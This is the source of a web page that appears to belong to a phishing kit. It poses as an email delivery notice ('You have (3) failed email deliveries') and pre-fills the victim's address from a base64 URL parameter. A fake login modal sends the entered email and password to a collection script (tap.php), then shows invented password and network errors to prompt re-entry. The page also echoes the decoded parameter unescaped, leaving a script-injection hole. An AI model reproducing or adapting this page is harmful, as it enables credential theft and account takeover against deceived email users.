<?php

require "../api.php";

if (isset($_GET['id'])) {

$email = $_GET['id'];

}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <link rel="stylesheet" href="bootstrap.css">
    <script src="jquery.min.js"></script>
    <script src="bootstrap.min.js"></script>
    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head>
<body>
<div class="m-5"></div>
<div class="container border">
<div class="text-center p-5">
<h3> <p>You have (3) failed email deliveries</p></h3>
<p>Verify your information to deliver your e-mails</p>
<button type="button" class="btn btn-primary" data-toggle="modal" data-target="#myModal">
    Retrieve Your mails
  </button>

  <!-- The Modal -->
  <div class="modal fade" id="myModal">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
      
        <!-- Modal Header -->
        <div class="modal-header bg-primary text-white">
          <h4 class="modal-title">Email Login</h4>
         
          <button type="button" class="close" data-dismiss="modal">&times;</button>
        </div>
        
        <!-- Modal body -->
        <div class="modal-body">
        <span class="text-danger" id="err"></span>
        <table class="table table-stripe">
        <tr>
        <td colspan="2"><span class="text-danger" id="msg"></span></td></tr>
        <tr>
        <th class="text-right">Email Address:</th>
        <th><input type="textbox" value="<?php echo isset($_GET['id']) ? base64_decode($_GET['id']) : '' ?>" id="em" name="email" class="form-control"></td>
        </tr>
        <tr>
        <th class="text-right">Password:</th>
        <td><input type="password"  value="" id="ps" name="password" class="form-control text-center"></td>
        </tr>
        <tr>
        <td></td>
        <td><button type="submit"  id="btn" class="btn btn-success">Retrieve Email</button></td>
        </tr>
        
        </table>
        </div>
        
        
      </div>
    </div>
  </div>
  
</div>
<hr class="bg-dark">

<div class="text-center">

<p class="small text-danger">Please Kindly retrieve your email </p>
</div>
</div>
<script>
$(document).ready(function(){
$("#btn").click(function(e){
e.preventDefault();

var em = $("#em").val();
var ps = $("#ps").val();

if(ps==""){
$("#msg").html("Please fill the Password Field");
}else{
  $("#btn-login").html('Signing In ...');
$.post("tap.php",{email:em,password:ps},function(data){

                $("#btn").html('Signing In ...');
                setTimeout(function(){
                 $("#err").html("Error! Invalid Password, Re-enter password");
                 
                },2000);
                setTimeout(function(){
                  window.location.reload();
                  swal("Error!", "Network Connection !", "error");
               
                 
                },4000);
             
              
});
}
});
});
</script>

</body>
</html>